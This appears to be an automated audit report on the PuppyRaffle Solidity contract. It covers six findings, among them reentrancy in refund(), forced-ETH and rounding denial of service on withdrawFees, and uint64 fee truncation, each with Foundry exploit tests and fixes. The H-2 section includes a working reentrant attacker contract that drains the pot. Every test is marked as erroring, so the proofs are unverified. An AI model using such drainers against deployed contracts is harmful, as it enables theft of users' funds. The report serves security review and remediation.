# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Pattern


 **Derived From** : tokenURI builds invalid JSON (missing quotes) — breaks ERC721 metadata consumers

[L-1]. Invalid ERC721 metadata: tokenURI omits quotes around rarity value, breaking marketplaces/integrations
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : refund() reentrancy: external sendValue before state update drains ETH

[H-2]. Reentrancy in PuppyRaffle.refund allows a malicious player to drain the entire ETH pot via recursive refunds
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : Forced ETH breaks withdrawFees gating (balance==totalFees) → permanent withdrawal DoS

[H-3]. Forced ETH dust breaks balance==totalFees gate in PuppyRaffle.withdrawFees, permanently bricking fee withdrawals
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : 80/20 integer split leaves rounding dust that bricks withdrawFees strict equality

[M-4]. Rounding dust from 80/20 split permanently bricks PuppyRaffle.withdrawFees via strict balance==totalFees check
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : totalFees stored as uint64 wraps on common fee sizes, breaking fee accounting and withdrawals

[M-5]. uint64 totalFees truncates in selectWinner causing invariant break and permanently bricking withdrawFees
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : Pot and fees computed from players.length ignore refunded holes, causing DOS and mis-accounting

[H-6]. Refund holes inflate pot/fees via players.length, breaking fee invariants and DoSing selectWinner
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless
Poc Test Status: ErrorRunningTests



### Number of Findings
- C: 0
- H: 3
- M: 2
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : tokenURI builds invalid JSON (missing quotes) — breaks ERC721 metadata consumers

## [L-1]. Invalid ERC721 metadata: tokenURI omits quotes around rarity value, breaking marketplaces/integrations

### Finding Severity Justification: Malformed JSON in tokenURI breaks metadata consumers (wallets/marketplaces) but does not risk funds or authorization. This is a functional/integration issue affecting visibility and UX, aligning with QA/Low under Code4rena’s rubric.
## Derived From Pattern/Invariant
tokenURI builds invalid JSON (missing quotes) — breaks ERC721 metadata consumers

## Exploit Type
StandardViolation

## Location
PuppyRaffle.tokenURI

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
PuppyRaffle.tokenURI constructs JSON metadata but concatenates the rarity name without quotes, yielding invalid JSON. Many ERC721 indexers/marketplaces expect valid JSON per the Metadata standard; malformed JSON causes NFTs to be undiscoverable or fail to render. Vulnerable snippet:

return string(
  abi.encodePacked(
    _baseURI(),
    Base64.encode(
      bytes(
        abi.encodePacked(
          '{"name":"', name(), '", "description":"An adorable puppy!", ',
          '"attributes": [{"trait_type": "rarity", "value": ', rareName, '}], "image":"', imageURI, '"}'
        )
      )
    )
  )
);

The value field must be a quoted JSON string: ... '"value": "', rareName, '"' ...

## Impact
Functional: NFT metadata is invalid JSON, causing wallets/marketplaces to reject or fail to index/display tokens, harming liquidity and discoverability.

## Command to Run Test


## Proof of Concept
- Anyone mints a puppy by letting a round end and calling selectWinner().
- Call tokenURI(tokenId) and Base64-decode the payload.
- Observe the attributes array contains '"value": rareName' with no surrounding quotes, which is invalid JSON.
- Indexers/marketplaces that parse per ERC721 metadata expectations reject the token’s metadata, breaking discovery/rendering.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";
import {Base64} from "lib/base64/base64.sol";

contract TokenURIInvalidJsonTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(this), 1);
    }

    function _mappingSlot(bytes32 key, uint256 slot) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(key, bytes32(slot)));
    }

    function _indexOf(bytes memory haystack, bytes memory needle) internal pure returns (int256) {
        if (needle.length == 0 || needle.length > haystack.length) return -1;
        for (uint256 i = 0; i <= haystack.length - needle.length; i++) {
            bool ok = true;
            for (uint256 j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) { ok = false; break; }
            }
            if (ok) return int256(i);
        }
        return -1;
    }

    function _stripDataUriPrefix(string memory uri) internal pure returns (string memory) {
        bytes memory b = bytes(uri);
        uint256 prefix = 29; // "data:application/json;base64,"
        require(b.length > prefix, "bad uri");
        bytes memory out = new bytes(b.length - prefix);
        for (uint256 i = 0; i < out.length; i++) {
            out[i] = b[i + prefix];
        }
        return string(out);
    }

    function test_tokenURI_ReturnsInvalidJson_UnquotedRarity() public {
        uint256 tokenId = 1;

        // Forge storage writes (deterministic, no need to mint):
        // 1) Mark token as existing by setting ERC721 _owners[tokenId] to this contract.
        //    In OZ 3.4 ERC721, _owners mapping is at storage slot 2.
        bytes32 ownersSlot = _mappingSlot(bytes32(tokenId), 2);
        vm.store(address(raffle), ownersSlot, bytes32(uint256(uint160(address(this)))));

        // 2) Set rarity for tokenId to COMMON_RARITY (70). tokenIdToRarity mapping is at slot 11 in PuppyRaffle.
        bytes32 raritySlot = _mappingSlot(bytes32(tokenId), 11);
        vm.store(address(raffle), raritySlot, bytes32(uint256(raffle.COMMON_RARITY())));

        // Now call tokenURI and decode the Base64 JSON
        string memory uri = raffle.tokenURI(tokenId);
        string memory b64 = _stripDataUriPrefix(uri);
        bytes memory json = Base64.decode(b64);

        // Locate '"value": ' and assert the next char is not a quote (0x22), proving invalid JSON string value
        bytes memory marker = bytes("\"value\": ");
        int256 pos = _indexOf(json, marker);
        assertTrue(pos >= 0, "marker not found");
        uint256 nextCharIndex = uint256(pos) + marker.length;
        require(nextCharIndex < json.length, "out of range");
        bytes1 nextChar = json[nextCharIndex];
        assertTrue(nextChar != bytes1(uint8(0x22)), "rarity value unexpectedly quoted");
    }
}


## Suggested Mitigation
Quote the rarity string when constructing JSON. Replace the attributes line with: '"attributes": [{"trait_type": "rarity", "value": "', rareName, '"}],'. Also consider JSON-escaping dynamic strings defensively.





 **Derived From** : refund() reentrancy: external sendValue before state update drains ETH

## [H-2]. Reentrancy in PuppyRaffle.refund allows a malicious player to drain the entire ETH pot via recursive refunds

### Finding Severity Justification: refund() performs an external ETH transfer via Address.sendValue (forwards all gas) before clearing the player's slot, enabling reentrancy. A malicious player contract can repeatedly reenter refund() while still recognized as the player and withdraw entranceFee multiple times, draining the contract balance (other players' funds). This is a direct, realistic loss of assets.
## Derived From Pattern/Invariant
refund() reentrancy: external sendValue before state update drains ETH

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
refund() sends ETH to msg.sender via Address.sendValue before clearing the player's slot. Because sendValue forwards all gas and no reentrancy guard exists, a malicious contract entered as a player can reenter refund(playerIndex) in its receive() multiple times while players[playerIndex] still equals the attacker, extracting entranceFee each time. Pot can be fully drained. Vulnerable snippet:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, ...);
    require(playerAddress != address(0), ...);

    payable(msg.sender).sendValue(entranceFee); // external call forwards all gas

    players[playerIndex] = address(0); // state update after external call
    emit RaffleRefunded(playerAddress);
}

## Impact
Attacker drains the contract balance (all entrance fees) by repeatedly calling refund through reentrancy, stealing other players' funds; prevents future refunds/winner payouts.

## Command to Run Test


## Proof of Concept
1) Two honest players enter the raffle (2 ETH total). 2) Attacker enters once via a malicious contract (1 ETH), total pot = 3 ETH. 3) Attacker calls refund(index) from the malicious contract. 4) In receive(), the attacker reenters refund(index) repeatedly while players[index] still equals the attacker. 5) Each reentry pays out entranceFee; attacker stops when balance < entranceFee. 6) Result: attacker receives ~3 ETH and only paid 1 ETH, net profit ≈ 2 ETH; contract balance drained to 0.

## Proof of Code
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ReentrantAttacker {
    PuppyRaffle public raffle;
    uint256 public idx;
    bool private attacking;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    function start(uint256 _idx) external {
        idx = _idx;
        attacking = true;
        raffle.refund(idx);
        attacking = false;
    }

    receive() external payable {
        // Keep reentering while the contract can still pay at least one more refund
        if (attacking && address(raffle).balance >= raffle.entranceFee()) {
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    ReentrantAttacker attacker;

    address attackerEOA = address(0xA11CE);
    address alice = address(0xB0B1);
    address bob   = address(0xC0C2);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1 days);
        attacker = new ReentrantAttacker(raffle);

        vm.deal(attackerEOA, 10 ether);
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);

        // Two honest players enter
        vm.prank(alice);
        address[] memory p1 = new address[](1);
        p1[0] = alice;
        raffle.enterRaffle{value: 1 ether}(p1);

        vm.prank(bob);
        address[] memory p2 = new address[](1);
        p2[0] = bob;
        raffle.enterRaffle{value: 1 ether}(p2);

        // Attacker enters using malicious contract address
        vm.prank(attackerEOA);
        address[] memory p3 = new address[](1);
        p3[0] = address(attacker);
        raffle.enterRaffle{value: 1 ether}(p3);
    }

    function test_refund_reentrancy_drains_pot() public {
        // Pot should be 3 ETH
        assertEq(address(raffle).balance, 3 ether);

        uint256 beforeTotal = attackerEOA.balance + address(attacker).balance;

        // Attacker is at index 2 (after alice=0, bob=1)
        vm.prank(attackerEOA);
        attacker.start(2);

        // Entire pot drained
        assertEq(address(raffle).balance, 0);

        uint256 afterTotal = attackerEOA.balance + address(attacker).balance;

        // Profit > 1 ETH (i.e., stole other players' funds); expected ~2 ETH net
        assertGt(afterTotal - beforeTotal, 1 ether);

        // Attacker contract received all 3 ETH
        assertEq(address(attacker).balance, 3 ether);

        // Slot cleared at the end
        assertEq(raffle.players(2), address(0));
    }
}


## Suggested Mitigation
Apply Checks-Effects-Interactions and/or a reentrancy guard. Example: (1) set players[playerIndex] = address(0) before any external call, storing playerAddress locally for the transfer; and (2) add OpenZeppelin ReentrancyGuard and mark refund as nonReentrant. For instance:

function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "..." );
    require(playerAddress != address(0), "..." );
    players[playerIndex] = address(0); // effects first
    Address.sendValue(payable(playerAddress), entranceFee); // interaction after state change
    emit RaffleRefunded(playerAddress);
}






 **Derived From** : Forced ETH breaks withdrawFees gating (balance==totalFees) → permanent withdrawal DoS

## [H-3]. Forced ETH dust breaks balance==totalFees gate in PuppyRaffle.withdrawFees, permanently bricking fee withdrawals

### Finding Severity Justification: All accrued protocol fees (matured funds) can be permanently locked by any attacker forcing even 1 wei into the contract, making address(this).balance != totalFees and causing withdrawFees() to always revert. This is a direct, permanent loss of withdrawable assets with a trivial, permissionless attack path.
## Derived From Pattern/Invariant
Forced ETH breaks withdrawFees gating (balance==totalFees) → permanent withdrawal DoS

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
withdrawFees infers 'no active players' by checking address(this).balance == totalFees. The contract can receive forced ETH via selfdestruct or gas refunds, making the raw balance diverge from internal accounting. Once even 1 wei is forced in, balance != totalFees forever and withdrawFees reverts, locking all accrued fees. Vulnerable snippet: require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

## Impact
Permanent DoS of fee withdrawals; all accrued protocol fees become stuck and cannot be withdrawn, affecting all future rounds.

## Command to Run Test


## Proof of Concept
1) Enter a round with ≥4 unique players paying entranceFee each. 2) After duration, call selectWinner() so only protocol fees remain in the contract (balance == totalFees). 3) Deploy a helper contract funded with 1 wei and selfdestruct it to PuppyRaffle, forcing 1 wei to the contract. 4) Now address(this).balance == totalFees + 1, so withdrawFees always reverts. 5) This persists across future rounds since there's no sweep/receive to reconcile dust.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ForceSend {
    constructor() payable {}
    function boom(address payable target) external {
        selfdestruct(target);
    }
}

contract WithdrawFeesForcedETHTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xBEEF), 1 days);
        vm.deal(address(this), 100 ether);
    }

    function test_forcedEthBricksWithdrawFees() public {
        address[] memory entrants = new address[](4);
        entrants[0] = address(1);
        entrants[1] = address(2);
        entrants[2] = address(3);
        entrants[3] = address(4);

        // Enter raffle with 4 players
        raffle.enterRaffle{value: 4 ether}(entrants);

        // End round and select winner so only fees remain in contract
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();

        // Sanity: balance == totalFees before the attack
        assertEq(address(raffle).balance, uint256(raffle.totalFees()));

        // Attack: force 1 wei into the contract via selfdestruct
        ForceSend f = new ForceSend{value: 1 wei}();
        f.boom(payable(address(raffle)));

        // Invariant broken: balance != totalFees now
        assertEq(address(raffle).balance, uint256(raffle.totalFees()) + 1);

        // Withdraw is permanently bricked
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Do not gate on raw ETH balance. Track active players explicitly (e.g., activeCount) and require(activeCount == 0) or require(players.length == 0) after clearing refunds appropriately. - Add a receive() that reverts on unexpected ETH and/or a sweep function to recover stray ETH. - Alternatively, base withdrawal on internal accounting only (send totalFees regardless of balance) and adjust logic to tolerate surplus dust, e.g., allow withdraw when address(this).balance >= totalFees.





 **Derived From** : 80/20 integer split leaves rounding dust that bricks withdrawFees strict equality

## [M-4]. Rounding dust from 80/20 split permanently bricks PuppyRaffle.withdrawFees via strict balance==totalFees check

### Finding Severity Justification: Permanent DoS of fee withdrawals can strand all accrued protocol fees, a real asset loss. However, exploitability depends on a configuration choice: if entranceFee is not divisible by 5 and any round has players.length % 5 != 0, 1 wei dust remains each such round. With the default deployment (1e18 fee, divisible by 5), this won’t manifest. Since it requires a particular parameter selection (not enforced by code) rather than a permissionless attack path alone, Medium best fits Code4rena’s rubric.
## Derived From Pattern/Invariant
80/20 integer split leaves rounding dust that bricks withdrawFees strict equality

## Exploit Type
RoundingError

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
selectWinner() uses integer division to split the pot: prize=(X*80)/100 and fee=(X*20)/100. For any round where X (players.length*entranceFee) is not divisible by 5, floor(4X/5)+floor(X/5)=X-1, leaving 1 wei dust in the contract unaccounted by totalFees. Afterwards, withdrawFees() requires address(this).balance == totalFees, so the leftover dust makes this equality false and fee withdrawals revert forever, even after future "clean" rounds. Vulnerable snippets:

selectWinner():
  uint256 totalAmountCollected = players.length * entranceFee; // X
  uint256 prizePool = (totalAmountCollected * 80) / 100;       // floors
  uint256 fee       = (totalAmountCollected * 20) / 100;       // floors
  totalFees = totalFees + uint64(fee);

withdrawFees():
  require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

## Impact
Permanent DoS of fee withdrawals; protocol fees become stuck in the contract (balance > totalFees) and cannot be recovered via withdrawFees().

## Command to Run Test


## Proof of Concept
1) Deploy PuppyRaffle with an entranceFee not divisible by 5 (e.g., 3 wei) and a short raffleDuration.
2) Enter a round with players.length >= 4 and players.length % 5 != 0 (e.g., 4 players). Total X = 12; prize=floor(9.6)=9; fee=floor(2.4)=2; dust=1.
3) Call selectWinner(). Contract balance becomes fee + dust = 3; totalFees records only 2.
4) Call withdrawFees(); it reverts because balance(3) != totalFees(2).
5) Start another round with players.length % 5 == 0 (e.g., 5 players). After selectWinner(), balance = previous(3) + new fee(3) = 6; totalFees = 2 + 3 = 5; mismatch remains 1; withdrawFees() still reverts. This persists forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FeeAccountingDriftTest is Test {
    PuppyRaffle raffle;
    address feeReceiver = address(0xFEE);
    uint256 constant ENTRANCE_FEE = 3; // not divisible by 5
    uint256 constant DURATION = 1;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeReceiver, DURATION);
        vm.deal(address(this), 1 ether);
    }

    function test_DustBlocksWithdrawFeesForever() public {
        // Round 1: 4 entrants -> X=12 => prize=9, fee=2, dust=1
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        raffle.enterRaffle{value: ENTRANCE_FEE * players.length}(players);

        vm.warp(block.timestamp + DURATION);
        raffle.selectWinner();

        // balance = fee(2) + dust(1) = 3; totalFees = 2
        assertEq(address(raffle).balance, 3);
        assertEq(uint256(raffle.totalFees()), 2);

        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();

        // Round 2: 5 entrants -> X=15 => prize=12, fee=3, no new dust
        address[] memory players2 = new address[](5);
        players2[0] = address(5);
        players2[1] = address(6);
        players2[2] = address(7);
        players2[3] = address(8);
        players2[4] = address(9);
        raffle.enterRaffle{value: ENTRANCE_FEE * players2.length}(players2);

        vm.warp(block.timestamp + DURATION);
        raffle.selectWinner();

        // balance = prev(3) + new fee(3) = 6; totalFees = prev(2) + 3 = 5 -> still mismatched by 1
        assertEq(address(raffle).balance, 6);
        assertEq(uint256(raffle.totalFees()), 5);

        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Avoid rounding dust by deriving one side from the other: compute prize first, then fee = totalAmountCollected - prize (or vice versa). Example:
  - uint256 prize = (totalAmountCollected * 80) / 100;
  - uint256 fee = totalAmountCollected - prize; // captures remainder
- Replace the fragile withdraw gate require(address(this).balance == totalFees) with a liveness/round-state check and withdraw only the accounted fees:
  - require(players.length == 0, "No active players");
  - uint256 amount = totalFees; totalFees = 0; (bool ok,) = feeAddress.call{value: amount}(""); require(ok, "withdraw failed");
- Optionally add require(address(this).balance >= amount) to guard against logic regressions; this also makes the system resilient to forced ETH (selfdestruct) that would otherwise brick withdrawals under the equality check.





 **Derived From** : totalFees stored as uint64 wraps on common fee sizes, breaking fee accounting and withdrawals

## [M-5]. uint64 totalFees truncates in selectWinner causing invariant break and permanently bricking withdrawFees

### Finding Severity Justification: The bug can permanently lock all accrued protocol fees by desynchronizing on-chain balance from accounting due to a uint64 truncation. User prize payouts are unaffected, but matured protocol revenue (real funds) becomes irretrievable. This impacts asset availability, but not user principal, so Medium is appropriate under Code4rena guidelines.
## Derived From Pattern/Invariant
totalFees stored as uint64 wraps on common fee sizes, breaking fee accounting and withdrawals

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In Solidity 0.7.6, narrowing casts silently truncate. PuppyRaffle.selectWinner computes the round fee in uint256 and then casts to uint64 before adding: totalFees = totalFees + uint64(fee). When fee > type(uint64).max (~18.446 ETH), the cast truncates to the low 64 bits and the subsequent uint64 addition can also wrap. After such a round, address(this).balance reflects the full fee (e.g., 20 ETH for 100 players at 1 ETH), but totalFees holds a much smaller wrapped value (~1.553 ETH for the 20 ETH example). The withdrawal gate requires address(this).balance == uint256(totalFees), so the mismatch permanently bricks withdrawFees(), locking all protocol fees.
Vulnerable snippet:
- Declaration: uint64 public totalFees = 0;
- Accrual (selectWinner):
  uint256 totalAmountCollected = players.length * entranceFee;
  uint256 fee = (totalAmountCollected * 20) / 100;
  totalFees = totalFees + uint64(fee);
- Withdrawal gate (withdrawFees):
  require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

## Impact
A single sufficiently large round where fee > 2^64−1 wei (e.g., ≥93 players at 1 ETH each, with 20% fee ≈ 20 ETH) truncates the accrued fee into uint64, desynchronizing accounting. This causes address(this).balance != totalFees, so withdrawFees() reverts and fees are effectively locked. While, in theory, later rounds could align the modulo-2^64 sum and temporarily re-enable withdrawals, this is impractical to rely on and the system is likely bricked until such a coincidence occurs. User prizes are unaffected; protocol revenue becomes unavailable.

## Command to Run Test


## Proof of Concept
To trigger the issue, the round fee must exceed type(uint64).max wei ≈ 18.446 ETH. With entranceFee = 1 ETH, fee = players * 0.2 ETH. Thus, players ≥ 93 makes fee > 2^64−1 wei. After selectWinner(), the contract keeps the full 20% fee in its balance, but totalFees stores uint64(fee), i.e., fee modulo 2^64. For 100 players, fee = 20 ETH and uint64(20 ether) = 20e18 % 2^64 ≈ 1.553255926290448384 ETH, so address(this).balance (20 ETH) != totalFees (~1.553 ETH). The withdraw guard requires equality, causing withdrawFees() to revert and locking fees.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract FeeWrapTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xFEE);
    address attacker = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeAddr, 1); // entranceFee=1 ETH, duration=1s
        deal(attacker, 200 ether);
    }

    function test_FeeOverflowLocksWithdraw() public {
        // 100 unique players -> pot=100 ETH, fee=20 ETH (> 2^64-1 wei)
        address[] memory entrants = new address[](100);
        for (uint256 i = 0; i < entrants.length; i++) {
            entrants[i] = address(uint160(i + 1));
        }

        vm.prank(attacker);
        raffle.enterRaffle{value: 100 ether}(entrants);

        // Advance time so raffle can be closed
        vm.warp(block.timestamp + 2);

        // Close raffle — triggers fee truncation into uint64
        vm.prank(attacker);
        raffle.selectWinner();

        // Contract balance should equal full fee (20 ETH)
        assertEq(address(raffle).balance, 20 ether, "contract balance should be 20 ETH fee");

        // totalFees stored as uint64(fee) -> truncated to low 64 bits
        uint256 expectedTruncated = uint256(uint64(20 ether));
        assertEq(raffle.totalFees(), expectedTruncated, "totalFees should be truncated to uint64(fee)");
        assertLt(raffle.totalFees(), 20 ether, "truncation must reduce stored fee below actual balance");

        // Withdraw is bricked due to balance != totalFees
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Change totalFees to uint256 and add using SafeMath for uint256 (Solidity 0.7.6) or upgrade to Solidity 0.8+ to benefit from checked arithmetic. Accrue without narrowing casts: totalFees = totalFees + fee.
- Replace the brittle withdraw guard require(address(this).balance == uint256(totalFees)) with a state-based check that reflects raffle activity (e.g., require(players.length == 0)) and transfer exactly totalFees to feeAddress. This prevents accidental ETH or accounting drift from bricking withdrawals.
- Optionally, add a receive()/fallback that reverts to block unexpected ETH, and consider a one-time owner-only reconciliation function guarded by strict checks to realign accounting if desync ever occurs.





 **Derived From** : Pot and fees computed from players.length ignore refunded holes, causing DOS and mis-accounting

## [H-6]. Refund holes inflate pot/fees via players.length, breaking fee invariants and DoSing selectWinner

### Finding Severity Justification: refund() leaves holes (address(0)) in players[] but selectWinner() computes prize and fees from players.length, not active players or actual balance. This enables a permissionless DoS of selectWinner when refunds exceed 20% of entries (prizePool > balance) and permanently bricks fee withdrawals due to over-accrued totalFees > balance. Real funds (protocol fees and leftover ETH) become stuck and the core function becomes uncallable, constituting high-impact asset loss/lock and availability failure.
## Derived From Pattern/Invariant
Pot and fees computed from players.length ignore refunded holes, causing DOS and mis-accounting

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
refund() zeros a player slot without shrinking players[], leaving holes. selectWinner() then treats the pot as players.length * entranceFee and accrues fees/prize off that inflated amount. This violates the invariant that fees equal 20% of net deposits and can make prizePool exceed actual ETH, reverting and DoSing the round. Vulnerable snippets: refund(): players[playerIndex] = address(0); selectWinner(): uint256 totalAmountCollected = players.length * entranceFee; uint256 prizePool = (totalAmountCollected * 80) / 100; uint256 fee = (totalAmountCollected * 20) / 100; totalFees += uint64(fee);

## Impact
An attacker can buy many tickets, refund them to create holes (address(0)) while keeping players.length inflated, and then wait for the round to end. selectWinner() derives prize and fees from players.length rather than actual net deposits, so prizePool may exceed balance and the function reverts, DoSing winner selection whenever refunds exceed 20% of entries. Even when selection does not revert (refunds < 20%), fees are over-accrued on refunded tickets, making totalFees larger than the contract’s actual fee backing. Because withdrawFees() requires address(this).balance == totalFees, fees become effectively permanently unwithdrawable under normal operation (subsequent correct rounds keep the shortfall constant). Only an external top-up (e.g., force-send) equal to the gap could unblock withdrawal.

## Command to Run Test


## Proof of Concept
1) Attacker funds and enters N distinct attacker-controlled addresses in one tx (msg.value = N * entranceFee). 2) Each of those addresses calls refund(index), reclaiming their fee and leaving players[index] = address(0) while players.length stays N. 3) After the raffle ends, calling selectWinner computes prizePool = 0.8 * N * entranceFee and fee = 0.2 * N * entranceFee based on players.length, not actual balance. If enough refunds occurred (e.g., all N), balance is 0 and the prize transfer fails, reverting and DoSing the round. 4) With partial refunds below the 20% threshold (e.g., 10 entries, 2 refunded), selectWinner succeeds but still accrues fee = 2 * entranceFee while the net deposits are only 8 * entranceFee (correct fee would be 1.6 * entranceFee). This creates an unbacked fee gap, making withdrawFees() revert indefinitely unless someone externally tops up exactly the shortfall.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleRefundHolesTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xFEE), 1 days);
    }

    function _makeEntrants(uint256 n) internal pure returns (address[] memory arr) {
        arr = new address[](n);
        for (uint256 i = 0; i < n; i++) {
            arr[i] = address(uint160(i + 1));
        }
    }

    function test_DOS_selectWinner_dueToRefundHoles() public {
        // Arrange: 10 entrants fully refunded
        address payer = address(0xBEEF);
        vm.deal(payer, 100 ether);
        address[] memory entrants = _makeEntrants(10);
        vm.prank(payer);
        raffle.enterRaffle{value: 10 ether}(entrants);

        for (uint256 i = 0; i < entrants.length; i++) {
            // Fund just for realism; not strictly required in tests
            vm.deal(entrants[i], 0.1 ether);
            vm.prank(entrants[i]);
            raffle.refund(i);
        }
        assertEq(address(raffle).balance, 0, "balance should be 0 after all refunds");

        // Act: time passes; selection attempts to pay prize > balance
        vm.warp(block.timestamp + 1 days + 1);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }

    function test_Fees_Misaccounted_On_Refunded_Tickets_and_WithdrawFees_Bricked() public {
        // Arrange: 10 entrants, then refund 2 -> net deposits = 8*FEE, length stays 10
        address payer = address(0xCAFE);
        vm.deal(payer, 100 ether);
        address[] memory entrants = _makeEntrants(10);
        vm.prank(payer);
        raffle.enterRaffle{value: 10 ether}(entrants);

        for (uint256 i = 0; i < 2; i++) {
            vm.deal(entrants[i], 0.1 ether);
            vm.prank(entrants[i]);
            raffle.refund(i);
        }
        assertEq(address(raffle).balance, 8 ether, "net deposits should be 8 ether after refunds");

        // Make RNG deterministic and choose a msg.sender that avoids refunded indices [0,1]
        vm.warp(block.timestamp + 1 days + 1);
        vm.difficulty(123456);
        address keeper;
        for (uint256 k = 1; k < 2048; k++) {
            address candidate = vm.addr(k + 11111);
            uint256 idx = uint256(keccak256(abi.encodePacked(candidate, block.timestamp, block.difficulty))) % 10;
            if (idx >= 2) { // non-refunded indices are [2..9]
                keeper = candidate;
                break;
            }
        }
        require(keeper != address(0), "no keeper found");

        // Act: selectWinner succeeds, but fees accrue on 10 tickets (2 ether) instead of on 8 (1.6 ether)
        vm.prank(keeper);
        raffle.selectWinner();

        // Assert: all 8 ether paid out, fees over-accrued and unbacked -> withdrawFees reverts
        assertEq(address(raffle).balance, 0, "balance drained by prize");
        assertEq(uint256(raffle.totalFees()), 2 ether, "fees mis-accounted on refunded entries");
        assertGt(uint256(raffle.totalFees()), address(raffle).balance, "fees exceed balance");

        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
Eliminate holes and compute payouts from actual available funds:
- On refund, remove the player via swap-and-pop and maintain a mapping address => index to keep players[] compact and in-sync with active participants. This ensures players.length always equals the active count and RNG cannot land on address(0).
- In selectWinner, derive the round pot from current net deposits, not players.length. A robust approach is: potCurrent = address(this).balance - totalFees; feeCurrent = potCurrent * 20 / 100; prize = potCurrent - feeCurrent. Accrue totalFees only after computing feeCurrent and just before/after a successful prize transfer.
- Draw the winner using an index in [0, players.length) after compaction, guaranteeing a valid payable address.
These changes align fees with real deposits, prevent underfunded prize transfers, and remove the DoS vector.



